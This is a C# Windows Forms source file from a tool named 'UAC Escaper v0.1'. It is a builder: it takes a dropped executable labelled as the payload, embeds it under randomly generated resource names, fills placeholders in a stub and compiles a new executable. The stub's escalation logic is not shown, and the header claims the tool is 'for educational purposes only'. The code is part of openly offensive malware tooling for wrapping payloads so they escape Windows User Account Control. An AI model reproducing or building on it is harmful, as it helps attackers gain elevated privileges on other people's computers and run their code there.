using System;
using System.IO;
using System.Windows.Forms;
using UAC_Escaper.Build;

/* 
       │ Author       : NYAN CAT
       │ Name         : UAC Escaper v0.1
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program is distributed for educational purposes only.
*/

namespace UAC_Escaper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.AllowDrop = true;
            this.DragEnter += new DragEventHandler(Form1_DragEnter);
            this.DragDrop += new DragEventHandler(Form1_DragDrop);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        void Form1_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
        }

        void Form1_DragDrop(object sender, DragEventArgs e)
        {
            try
            {
                string[] file = (string[])e.Data.GetData(DataFormats.FileDrop);
                SaveFileDialog saveFileDialog = new SaveFileDialog
                {
                    Filter = ".exe (*.exe)|*.exe",
                    InitialDirectory = Environment.CurrentDirectory,
                    OverwritePrompt = false,
                };
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    Builder builder = new Builder
                    {
                        PayloadPath = file[0],
                        PayloadResources = Path.GetRandomFileName().Replace(".", ""),
                        SaveFileName = saveFileDialog.FileName,
                        TempDirectory = Path.Combine(Environment.CurrentDirectory, "temp"),
                        ResourceManager = Path.GetRandomFileName().Replace(".", ""),
                        StubCs = Properties.Resources.Stub,
                    };
                    builder.Replacer("#exe", Path.GetExtension(builder.PayloadPath));
                    builder.Replacer("#payload", builder.PayloadResources);
                    builder.Replacer("#resource", builder.ResourceManager);
                    MessageBox.Show(this, new Compiler().Compile(builder));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

    }
}
